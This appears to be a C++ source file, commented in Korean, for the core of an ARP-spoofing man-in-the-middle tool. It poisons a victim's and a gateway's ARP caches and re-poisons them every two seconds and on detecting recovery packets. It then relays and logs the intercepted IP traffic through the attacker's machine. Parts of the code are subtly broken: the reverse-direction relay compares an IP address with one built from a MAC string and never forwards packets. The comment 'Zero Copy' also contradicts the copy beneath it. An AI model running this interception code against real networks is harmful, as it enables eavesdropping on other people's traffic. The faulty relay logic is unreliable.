#include "Engine.h"
#include "ethhdr.h"
#include "../packet/IpHdr.h" // Step 3에서 만든 헤더
#include <iostream>
#include <cstring>

Engine::Engine(std::string_view interfaceName, std::string_view senderIp, std::string_view targetIp) {
    // 1. 디바이스 오픈
    pcap_ = std::make_unique<PcapDevice>(interfaceName); // PcapDevice의 생성자를 사용해서 핸들 open

    // 2. Flow 초기화 및 MAC Resolve (Blocking)
    arpFlow_ = std::make_unique<ArpFlow>(pcap_.get(), Ip(senderIp), Ip(targetIp));
    arpFlow_->resolveMacs(); // 여기서 실패하면 예외 발생하여 종료됨

    std::cout << "[Engine] Initialized. Starting interception..." << std::endl;
}

Engine::~Engine() {
    // 엔진이 종료될 때 자동으로 복구 수행
    if (arpFlow_) {
        std::cout << "[Engine] Stopping... Recovering victims..." << std::endl;
        arpFlow_->recover();
    }
}

void Engine::run() {
    pcap_t* handle = pcap_->getHandle();
    struct pcap_pkthdr* header;
    const u_char* packet;

    // 초기 감염
    arpFlow_->sendInfectionPacket();
    lastInfectionTime_ = std::chrono::steady_clock::now();

    while (running_) {
        // 1. 패킷 수신 (Non-blocking 느낌으로 빠르게)
        int res = pcap_next_ex(handle, &header, &packet);

        // 2. 주기적 재감염 (2초마다) - 루프 도는 중에 틈틈이 체크
        auto now = std::chrono::steady_clock::now();
        if (std::chrono::duration_cast<std::chrono::seconds>(now - lastInfectionTime_).count() >= 2) {
            std::cout << "[Info] Re-infecting..." << std::endl;
            arpFlow_->sendInfectionPacket(); // 지속적인 감염
            lastInfectionTime_ = now;
        }

        if (res == 0) continue; // Timeout
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            std::cerr << "[Error] Pcap Loop broken." << std::endl;
            break;
        }

        // 3. 패킷 분류 및 처리
        EthHdr* eth = (EthHdr*)packet;

        if (eth->type() == EthHdr::Arp) {
            ArpHdr* arp = (ArpHdr*)(packet + sizeof(EthHdr));
            // 복구 패킷 감지 시 즉시 재감염
            if (arpFlow_->checkRecoverPacket(eth, arp)) {
                std::cout << "[Warn] Detected ARP Recover! Re-infecting immediately." << std::endl;
                arpFlow_->sendInfectionPacket();
            }
        }
        else if (eth->type() == EthHdr::Ip4) {
            // IP 패킷 릴레이
            relayIp(packet, header->len); // 여기서는 원본 포인터와 길이를 넘김
        }
    }
}

void Engine::relayIp(const uint8_t* packet, size_t len) {
    // *Zero Copy* 전략: 스택 버퍼에 복사 후 수정하여 전송
    // (pcap 내부 버퍼를 직접 수정하지 않기 위해 1회 복사는 필수적이나,
    //  힙 할당(vector)보다 스택(array)이 훨씬 빠름)

    if (len > 1514) return; // Jumbo frame 등은 무시

    uint8_t buffer[1514];
    std::memcpy(buffer, packet, len);

    EthHdr* eth = (EthHdr*)buffer;
    IpHdr* ip = (IpHdr*)(buffer + sizeof(EthHdr)); // IP 헤더 확인용
    bool relayed = false;

    // Sender -> Target 흐름
    if (eth->smac_ == arpFlow_->getSenderMac() && ip->dst() != Ip::getMyIp(pcap_->getInterfaceName())) {
        // 내가 받을 패킷이 아닌데 나한테 왔다? -> 릴레이 대상
        eth->dmac_ = arpFlow_->getTargetMac(); // 목적지를 Gateway로
        eth->smac_ = Mac(pcap_->getMacAddress()); // 보낸이를 나(Attacker)로
        relayed = true;
    }
    // Target -> Sender 흐름
    else if (eth->smac_ == arpFlow_->getTargetMac() && ip->dst() == Ip(arpFlow_->getSenderMac().toString())) {
        // Gateway가 Sender에게 보내는 패킷
        eth->dmac_ = arpFlow_->getSenderMac(); // 목적지를 Sender로
        eth->smac_ = Mac(pcap_->getMacAddress()); // 보낸이를 나로
    }
    if (relayed) {
        logger_->push({ip->src(), ip->dst(), (uint32_t)len});
        pcap_->sendPacket(buffer, len);
    }
}